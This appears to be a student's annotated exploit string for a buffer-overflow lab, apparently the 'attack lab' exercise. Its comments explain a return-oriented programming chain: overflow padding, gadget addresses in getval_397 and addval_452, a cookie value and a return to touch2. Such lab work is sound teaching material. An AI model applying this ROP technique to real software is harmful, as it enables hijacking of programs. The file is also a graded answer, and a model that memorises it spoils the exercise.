#the first bunch of 0's are there to overflow the buffer
#45 19 40 00 00 00 00 00 this makes getbuf return to the middle of getval_397, which is 58 90 90 90 c3, which if you look at the chart is popq %rax
#78 43 27 2d 00 00 00 00 this is the cookie which is popped into rax
#3f 19 40 00 00 00 00 00 this will cause getval_397 to return to the middle of addval_452, which is 48 89 c7 90 c3, which is movq %rax, %rdi
#d4 17 40 00 00 00 00 00 this will cause addval_452 to return to touch2
